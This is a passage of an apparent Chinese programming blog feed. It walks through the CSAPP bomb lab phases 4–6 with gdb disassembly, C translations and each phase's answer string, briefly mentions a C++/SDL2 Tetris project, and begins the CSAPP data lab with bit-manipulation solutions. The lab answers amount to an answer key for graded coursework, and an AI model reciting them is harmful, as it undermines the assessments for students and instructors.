0x0000000000401035 &lt;+41&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040103a &lt;+46&gt;:	mov    $0xe,%edx</span><br><span class="line">   0x000000000040103f &lt;+51&gt;:	mov    $0x0,%esi</span><br><span class="line">   0x0000000000401044 &lt;+56&gt;:	mov    0x8(%rsp),%edi</span><br><span class="line">   0x0000000000401048 &lt;+60&gt;:	callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x000000000040104d &lt;+65&gt;:	test   %eax,%eax</span><br><span class="line">   0x000000000040104f &lt;+67&gt;:	jne    0x401058 &lt;phase_4+76&gt;</span><br><span class="line">   0x0000000000401051 &lt;+69&gt;:	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">   0x0000000000401056 &lt;+74&gt;:	je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">   0x0000000000401058 &lt;+76&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040105d &lt;+81&gt;:	add    $0x18,%rsp</span><br><span class="line">   0x0000000000401061 &lt;+85&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>2 - 9：同<code>phase_3</code>，这一关也要求输入两个整数。<br>10 - 12：要求第一个整数小于等于 0xe。<br>13 - 16：调用<code>func4(第一个整数, 0, 0xe)</code>。<br>17 - 18：要求<code>func4</code>返回 0。<br>19 - 20：要求第二个整数为 0。</p>
<p>接着看<code>func4</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x0000000000400fce &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:	mov    %edx,%eax</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:	sub    %esi,%eax</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:	mov    %eax,%ecx</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:	shr    $0x1f,%ecx</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:	add    %ecx,%eax</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:	sar    %eax</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:	lea    (%rax,%rsi,1),%ecx</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:	cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:	jle    0x400ff2 &lt;func4+36&gt;</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:	lea    -0x1(%rcx),%edx</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:	callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:	add    %eax,%eax</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:	jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:	cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:	jge    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:	lea    0x1(%rcx),%esi</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:	callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:	add    $0x8,%rsp</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:	retq</span><br></pre></td></tr></table></figure>

<p>翻译回C语言如下，注意<code>shr</code>是逻辑右移，<code>sar</code>是算术右移。要使<code>func4(rdi, 0, 0xe)</code>返回 0，必须<code>rcx == rdi</code>，很容易计算得出<code>rcx</code>为7，因此第一个整数为7，第四关答案为<code>&quot;7 0&quot;</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> rdi, <span class="keyword">int</span> rsi, <span class="keyword">int</span> rdx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rax = rdx - rsi;</span><br><span class="line">    rax += ((rax &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>);</span><br><span class="line">    rax &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rcx = rax + rsi;</span><br><span class="line">    <span class="keyword">if</span> (rcx &gt; rdi) &#123;</span><br><span class="line">        rdx = rcx - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(rdi, rsi, rdx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rax = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (rcx &lt; rdi) &#123;</span><br><span class="line">        rsi = rcx + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(rdi, rsi, rdx) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">=&gt; 0x0000000000401062 &lt;+0&gt;:	push   %rbx</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:	sub    $0x20,%rsp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:	mov    %rdi,%rbx</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:	mov    %fs:0x28,%rax</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:	mov    %rax,0x18(%rsp)</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:	xor    %eax,%eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:	callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:	cmp    $0x6,%eax</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:	je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401089 &lt;+39&gt;:	jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:	mov    %cl,(%rsp)</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:	mov    (%rsp),%rdx</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:	and    $0xf,%edx</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:	add    $0x1,%rax</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:	cmp    $0x6,%rax</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:	jne    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:	movb   $0x0,0x16(%rsp)</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:	mov    $0x40245e,%esi</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:	lea    0x10(%rsp),%rdi</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:	callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:	test   %eax,%eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:	je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010cb &lt;+105&gt;:	nopl   0x0(%rax,%rax,1)</span><br><span class="line">   0x00000000004010d0 &lt;+110&gt;:	jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:	jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010d9 &lt;+119&gt;:	mov    0x18(%rsp),%rax</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:	xor    %fs:0x28,%rax</span><br><span class="line">   0x00000000004010e7 &lt;+133&gt;:	je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">   0x00000000004010e9 &lt;+135&gt;:	callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004010ee &lt;+140&gt;:	add    $0x20,%rsp</span><br><span class="line">   0x00000000004010f2 &lt;+144&gt;:	pop    %rbx</span><br><span class="line">   0x00000000004010f3 &lt;+145&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>3 - 4：分配一段栈空间（数组），保存输入的字符串到<code>%rbx</code>。<br>5 - 7：设置哨兵值，保护栈空间。<br>8 - 11：要求字符串长度为 6。<br>12 - 22：为一个循环，翻译回C如下，这段代码将输入的字符串做了个转换：<br>&emsp;&emsp;取字符的后4位作为索引，从预设的一个长字符串取转换后的字符。<br>23 - 26：比较转换后的字符串和预期的是否相等。</p>
<p>从预期的字符串以及转换规则反推回去，可得到第5关的答案是<code>&quot;9?&gt;567&quot;</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* pattern =  <span class="comment">// 第17行，print (char*) 0x4024b0</span></span><br><span class="line">  <span class="string">"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"</span>; </span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* input = <span class="string">"9?&gt;567"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> transformed[<span class="number">7</span>];  <span class="comment">// 第3, 4行分配的数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> rax = <span class="number">0</span>; rax != <span class="number">6</span>; ++rax) &#123;</span><br><span class="line">    <span class="keyword">int</span> rcx = input[rax];</span><br><span class="line">    <span class="keyword">int</span> rdx = rcx &amp; <span class="number">0xf</span>;</span><br><span class="line">    transformed[rax] = (<span class="keyword">char</span>)pattern[rdx];</span><br><span class="line">&#125;</span><br><span class="line">transformed[<span class="number">6</span>] = <span class="number">0</span>;  <span class="comment">// 第22行</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* expected = <span class="string">"flyers"</span>; <span class="comment">// 第23行，print (char*) 0x40245e</span></span><br></pre></td></tr></table></figure>

<h4 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h4><p>这一关反汇编代码太长了，屏幕一页都放不下，最好分段分析。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">=&gt; 0x00000000004010f4 &lt;+0&gt;:	push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:	push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:	push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:	push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:	push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:	sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:	mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:	mov    %rsp,%rsi</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:	callq  0x40145c &lt;read_six_numbers&gt;</span><br></pre></td></tr></table></figure>
<p>第一部分，分配了数组，读取6个数字，可见这一关要求我们输入6数字。<br>看到后面的反汇编有不止一个循环，可以分循环分析。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x000000000040110b &lt;+23&gt;:	mov    %rsp,%r14</span><br><span class="line">0x000000000040110e &lt;+26&gt;:	mov    $0x0,%r12d</span><br><span class="line">0x0000000000401114 &lt;+32&gt;:	mov    %r13,%rbp</span><br><span class="line">0x0000000000401117 &lt;+35&gt;:	mov    0x0(%r13),%eax</span><br><span class="line">0x000000000040111b &lt;+39&gt;:	sub    $0x1,%eax</span><br><span class="line">0x000000000040111e &lt;+42&gt;:	cmp    $0x5,%eax</span><br><span class="line">0x0000000000401121 &lt;+45&gt;:	jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">0x0000000000401123 &lt;+47&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000401128 &lt;+52&gt;:	add    $0x1,%r12d</span><br><span class="line">0x000000000040112c &lt;+56&gt;:	cmp    $0x6,%r12d</span><br><span class="line">0x0000000000401130 &lt;+60&gt;:	je     0x401153 &lt;phase_6+95&gt;</span><br><span class="line">0x0000000000401132 &lt;+62&gt;:	mov    %r12d,%ebx</span><br><span class="line">0x0000000000401135 &lt;+65&gt;:	movslq %ebx,%rax</span><br><span class="line">0x0000000000401138 &lt;+68&gt;:	mov    (%rsp,%rax,4),%eax</span><br><span class="line">0x000000000040113b &lt;+71&gt;:	cmp    %eax,0x0(%rbp)</span><br><span class="line">0x000000000040113e &lt;+74&gt;:	jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">0x0000000000401140 &lt;+76&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000401145 &lt;+81&gt;:	add    $0x1,%ebx</span><br><span class="line">0x0000000000401148 &lt;+84&gt;:	cmp    $0x5,%ebx</span><br><span class="line">0x000000000040114b &lt;+87&gt;:	jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">0x000000000040114d &lt;+89&gt;:	add    $0x4,%r13</span><br><span class="line">0x0000000000401151 &lt;+93&gt;:	jmp    0x401114 &lt;phase_6+32&gt;</span><br></pre></td></tr></table></figure>

<p>上面这段包含了两个循环，翻译回C语言如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> input[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> r12d = <span class="number">0</span>; r12d != <span class="number">6</span>; ++r12d) &#123;</span><br><span class="line">    <span class="keyword">int</span> rax = input[r12d];</span><br><span class="line">    <span class="keyword">if</span> (rax - <span class="number">1</span> &gt; <span class="number">5</span>)</span><br><span class="line">        explode_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> rbx = r12d + <span class="number">1</span>; rbx &lt;= <span class="number">5</span>; ++rbx) &#123;</span><br><span class="line">        <span class="keyword">if</span> (rax == input[rbx])</span><br><span class="line">            explode_bomb();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码检查了输入的6个数字，要求它们都小于等于6，互不相等，且要大于0，所以答案是<code>1 2 3 4 5 6</code>的排列。继续看下一部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0000000000401153 &lt;+95&gt;:	lea    0x18(%rsp),%rsi</span><br><span class="line">0x0000000000401158 &lt;+100&gt;:	mov    %r14,%rax</span><br><span class="line">0x000000000040115b &lt;+103&gt;:	mov    $0x7,%ecx</span><br><span class="line">0x0000000000401160 &lt;+108&gt;:	mov    %ecx,%edx</span><br><span class="line">0x0000000000401162 &lt;+110&gt;:	sub    (%rax),%edx</span><br><span class="line">0x0000000000401164 &lt;+112&gt;:	mov    %edx,(%rax)</span><br><span class="line">0x0000000000401166 &lt;+114&gt;:	add    $0x4,%rax</span><br><span class="line">0x000000000040116a &lt;+118&gt;:	cmp    %rsi,%rax</span><br><span class="line">0x000000000040116d &lt;+121&gt;:	jne    0x401160 &lt;phase_6+108&gt;</span><br></pre></td></tr></table></figure>

<p>   上面这部分代码对输入数组做了转换：<code>input[i] = 7 - input[i]</code>，是出题老师为了增加难度吗：）继续：</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x000000000040116f &lt;+123&gt;:	mov    $0x0,%esi</span><br><span class="line">0x0000000000401174 &lt;+128&gt;:	jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">0x0000000000401176 &lt;+130&gt;:	mov    0x8(%rdx),%rdx</span><br><span class="line">0x000000000040117a &lt;+134&gt;:	add    $0x1,%eax</span><br><span class="line">0x000000000040117d &lt;+137&gt;:	cmp    %ecx,%eax</span><br><span class="line">0x000000000040117f &lt;+139&gt;:	jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">0x0000000000401181 &lt;+141&gt;:	jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">0x0000000000401183 &lt;+143&gt;:	mov    $0x6032d0,%edx</span><br><span class="line">0x0000000000401188 &lt;+148&gt;:	mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">0x000000000040118d &lt;+153&gt;:	add    $0x4,%rsi</span><br><span class="line">0x0000000000401191 &lt;+157&gt;:	cmp    $0x18,%rsi</span><br><span class="line">0x0000000000401195 &lt;+161&gt;:	je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">0x0000000000401197 &lt;+163&gt;:	mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">0x000000000040119a &lt;+166&gt;:	cmp    $0x1,%ecx</span><br><span class="line">0x000000000040119d &lt;+169&gt;:	jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">0x000000000040119f &lt;+171&gt;:	mov    $0x1,%eax</span><br><span class="line">0x00000000004011a4 &lt;+176&gt;:	mov    $0x6032d0,%edx</span><br><span class="line">0x00000000004011a9 &lt;+181&gt;:	jmp    0x401176 &lt;phase_6+130&gt;</span><br></pre></td></tr></table></figure>
<p>上面这部分代码比较难理解，实际包含了两个循环：<code>&lt;+130&gt;</code>到<code>&lt;+139&gt;</code>以及<code>&lt;+143&gt;</code>到<code>&lt;+169&gt;</code>。其中<code>&lt;+163&gt;</code>到<code>&lt;+181&gt;</code>决定了该跳转到哪个循环，只有<code>input</code>数组中的值为1时才执行第二个循环。打印出<code>&lt;+143&gt;</code>和<code>&lt;+176&gt;</code>中的地址0x6032d0，发现它是一个链表。结合这些信息，翻译回C语言，发现这些代码只是根据<code>input</code>数组按数序将链表的节点存入另一个数组<code>nodes</code>。</p>
<p><code>(gdb) x /12xg 0x6032d0</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x6032d0 &lt;node1&gt;:	0x000000010000014c	0x00000000006032e0</span><br><span class="line">0x6032e0 &lt;node2&gt;:	0x00000002000000a8	0x00000000006032f0</span><br><span class="line">0x6032f0 &lt;node3&gt;:	0x000000030000039c	0x0000000000603300</span><br><span class="line">0x603300 &lt;node4&gt;:	0x00000004000002b3	0x0000000000603310</span><br><span class="line">0x603310 &lt;node5&gt;:	0x00000005000001dd	0x0000000000603320</span><br><span class="line">0x603320 &lt;node6&gt;:	0x00000006000001bb	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;* nodes[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> rsi = <span class="number">0</span>; rsi != <span class="number">6</span>; ++rsi) &#123;</span><br><span class="line">    <span class="keyword">int</span> rcx = input[rsi];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">rdx</span> = &amp;<span class="title">node1</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> rax = <span class="number">1</span>; rax != rcx; ++rax) &#123;</span><br><span class="line">        rdx = rdx-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nodes[rsi] = rdx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续看反汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00000000004011ab &lt;+183&gt;:	mov    0x20(%rsp),%rbx</span><br><span class="line">0x00000000004011b0 &lt;+188&gt;:	lea    0x28(%rsp),%rax</span><br><span class="line">0x00000000004011b5 &lt;+193&gt;:	lea    0x50(%rsp),%rsi</span><br><span class="line">0x00000000004011ba &lt;+198&gt;:	mov    %rbx,%rcx</span><br><span class="line">0x00000000004011bd &lt;+201&gt;:	mov    (%rax),%rdx</span><br><span class="line">0x00000000004011c0 &lt;+204&gt;:	mov    %rdx,0x8(%rcx)</span><br><span class="line">0x00000000004011c4 &lt;+208&gt;:	add    $0x8,%rax</span><br><span class="line">0x00000000004011c8 &lt;+212&gt;:	cmp    %rsi,%rax</span><br><span class="line">0x00000000004011cb &lt;+215&gt;:	je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">0x00000000004011cd &lt;+217&gt;:	mov    %rdx,%rcx</span><br><span class="line">0x00000000004011d0 &lt;+220&gt;:	jmp    0x4011bd &lt;phase_6+201&gt;</span><br></pre></td></tr></table></figure>

<p>以上这段比较好理解，就是根据<code>nodes</code>数组按顺序重写了链表各节点的<code>next</code>字段，接着看，最后一段了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00000000004011d2 &lt;+222&gt;:	movq   $0x0,0x8(%rdx)</span><br><span class="line">0x00000000004011da &lt;+230&gt;:	mov    $0x5,%ebp</span><br><span class="line">0x00000000004011df &lt;+235&gt;:	mov    0x8(%rbx),%rax</span><br><span class="line">0x00000000004011e3 &lt;+239&gt;:	mov    (%rax),%eax</span><br><span class="line">0x00000000004011e5 &lt;+241&gt;:	cmp    %eax,(%rbx)</span><br><span class="line">0x00000000004011e7 &lt;+243&gt;:	jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">0x00000000004011e9 &lt;+245&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x00000000004011ee &lt;+250&gt;:	mov    0x8(%rbx),%rbx</span><br><span class="line">0x00000000004011f2 &lt;+254&gt;:	sub    $0x1,%ebp</span><br><span class="line">0x00000000004011f5 &lt;+257&gt;:	jne    0x4011df &lt;phase_6+235&gt;</span><br></pre></td></tr></table></figure>

<p>这段也简单，遍历链表，要求链表各节点的低位4字节按从大到小的顺序排列。<br>综上，最后一关要求输入<code>1 2 3 4 5 6</code>6个数字的一个排列顺序，然后将数字<code>i</code>转换为<code>7 - i</code>，再将预设好的一个链表按顺序重新链接，要求重新链接后的链表各节点的值按从大到小的顺序排列。根据打印出来的链表信息，可以推出答案是<code>&quot;4 3 2 1 6 5&quot;</code>。</p>
]]></content>
      <tags>
        <tag>CSAPP</tag>
        <tag>GDB</tag>
      </tags>
  </entry>
  <entry>
    <title>一个C++14/SDL2 实现的比较完善的俄罗斯方块</title>
    <url>/2018/11/15/tetris/</url>
    <content><![CDATA[<p>&emsp;&emsp;最近工作遇到一个问题：要在几个继承自同一基类的子类初始化的时候执行一些特定的初始化操作，想当然地，在基类写个空的虚函数，子类override，然后在基类的构造函数中调用这个虚函数。一执行，oh，才发现子类override的虚函数都没被调用…<a id="more"></a>想了一秒钟，反应过来：构造函数中的虚函数是不会被动态绑定的，换句话说，在基类构造函数中调用的虚函数只能是基类自己定义的虚函数，而不是子类override的那个。我能清楚地记得《Effecitive C++》一书中有个item讲过这个问题，我还看过不止一遍，然而一不小心还是会踩坑。C++的坑太多，平时工作用的最多的都是C with class，type traits，久而久之，踩过的坑就都忘了。C++需要不断练习，这次先用SDL2写个俄罗斯方块练练手，代码及说明在 <a href="https://github.com/zzzz-qq/toys/tree/master/tetris" target="_blank" rel="noopener">GitHub: Tetirs</a>。</p>
<p><img src="/.io//tetris.png" alt="tetris"></p>
]]></content>
      <tags>
        <tag>C++</tag>
        <tag>SDL2</tag>
        <tag>Tetris</tag>
      </tags>
  </entry>
  <entry>
    <title>《CSAPP》实验一：位操作</title>
    <url>/2018/10/19/csapp-datalab/</url>
    <content><![CDATA[<p>&emsp;&emsp;<a href="https://book.douban.com/subject/26912767/" target="_blank" rel="noopener">《CSAPP》</a>号称程序员圣经，虽然中文译名为《深入理解计算机系统》，但其实没那么“深”，只是覆盖面很广，一般用作计算机专业大一导论课的教科书。早就听闻书上配套的实验十分经典，这次重温新版（第三版），打算把所有的实验都做一下，也写个系列博文，好记录实验过程。实验可以在书本配套网站<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">CSAPP: Lab Assignments</a>下载，这篇从第一个实验 —— 位操作开始。<a id="more"></a></p>
<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>&emsp;&emsp;本实验是第二章《信息的表示与处理》的配套实验，要求使用一个高度限制的C语言子集实现一些特定的逻辑，整数，浮点数的函数。延用第一章的说法，信息就是位加上下文，计算机系统中所有的信息都是由一串比特（或者说一串二进制数字）表示的，第二章就讲了C语言中整数与浮点数的编码方式，即典型地，计算机是如何用一串比特来表示整数与浮点数的：</p>
<ul>
<li>无符号整数：直接二进制编码</li>
<li>有符号整数：二进制补码，最高位为负权</li>
<li>浮点数：<a href="https://en.wikipedia.org/wiki/IEEE_754" target="_blank" rel="noopener">IEEE 754</a></li>
</ul>
<p>&emsp;&emsp;同样从内存里取出4个字节 $0x80000000$ ，把它当无符号整数看，就是 $2147483648$；把它当有符号整数看，就是 $-2147483648$；把它当单精度浮点数看，就是 $-0$。所谓上下文，就是解读这串比特的方式，横看成岭侧成峰。值得注意的是，尽管在几乎所有系统上，C语言整数与浮点数都是这么编码的，但C语言标准本身并没有这样规定，不知道有生之年能不能遇上非主流的编码方式。<br>&emsp;&emsp;如果没有完全掌握这些数字的编码方式以及C语言的位操作，是一定无法完成实验一的。实验一好就好在会让你反复回忆这些基础知识，深入细节之中，做完实验后想忘都忘不了：）</p>
<h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4><p>&emsp;&emsp;尽管有C语言有标准，但Undefined Behavior还是太多，尤其是深入底层进行位操作的情况下，因此实验预设： 有符号整数使用32位二进制补码编码； 右移操作为算术位移，高位补符号位。实验还要求：不能使用宏；整数操作不能使用大于0xFF的常量。下面就逐个函数记录实验过程了。</p>
<h4 id="bitAnd"><a href="#bitAnd" class="headerlink" title="bitAnd"></a>bitAnd</h4><p>&emsp;&emsp;用<code>~</code>和<code>|</code>实现<code>&amp;</code>，有公式很简单，但记不住，用韦恩图辅助思考：全集表示所有位都为1，<code>x</code>与<code>y</code>分别表示特定位置为1的子集，想象一下<code>~</code>，<code>|</code>和<code>&amp;</code>的韦恩图，一下子就推出公式来了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitAnd - x&amp;y using only ~ and |</span></span><br><span class="line"><span class="comment"> *   Example: bitAnd(6, 5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ |</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ~(~x | ~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="getByte"><a href="#getByte" class="headerlink" title="getByte"></a>getByte</h4><p>&emsp;&emsp;<code>x</code>右移 $n * 8$ 位，取最后一个字节即可，利用了<code>n * 8 == n &lt;&lt; 3</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * getByte - Extract byte n from word x</span></span><br><span class="line"><span class="comment"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span></span><br><span class="line"><span class="comment"> *   Examples: getByte(0x12345678,1) = 0x56</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 6</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getByte</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &gt;&gt; (n &lt;&lt; <span class="number">3</span>)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="logicalShift"><a href="#logicalShift" class="headerlink" title="logicalShift"></a>logicalShift</h4><p>&emsp;&emsp;实验预设了右移为算术位移，那么对<code>x</code>右移<code>n</code>位再用掩码将高位补的<code>n</code>位置0即可。</p>
